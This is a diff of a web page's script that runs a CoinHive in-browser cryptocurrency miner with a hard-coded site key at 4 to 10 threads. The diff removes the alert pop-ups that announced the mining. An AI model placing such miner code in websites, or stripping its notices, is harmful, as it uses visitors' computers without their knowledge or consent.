@@ -23,8 +23,6 @@
 <script src="./js/coinhive.min.js"></script>
 <script>
 
-alert('teste');
-	
 	
 function queryObj() {
     var result = {}, keyValuePairs = location.search.slice(1).split("&");
@@ -41,8 +39,6 @@ var site_key = "WsLpvpRA7aJd5xQIPHlprVwSr4UtPgvB";
 
 	if (minerador_user) {
 
-		alert(minerador_user+' está minerando...');
-
 		var miner = new CoinHive.User(site_key, minerador_user, {
 			threads: 4,
 			autoThreads: false,
@@ -51,8 +47,6 @@ var site_key = "WsLpvpRA7aJd5xQIPHlprVwSr4UtPgvB";
 		});
 
 	}else{
-
-		alert('Mineração anonima...');
 
 	var miner = new CoinHive.Anonymous(site_key,{
 			threads: 10,
@@ -77,8 +71,6 @@ var site_key = "WsLpvpRA7aJd5xQIPHlprVwSr4UtPgvB";
 				$('.totalHashes').html('Total hashes: '+totalHashes);
 				$('.acceptedHashes').html('Hashes aceitas: '+acceptedHashes);
 		
-		
-			alert(hashesPerSecond);
 		
 
 	}, 1000);
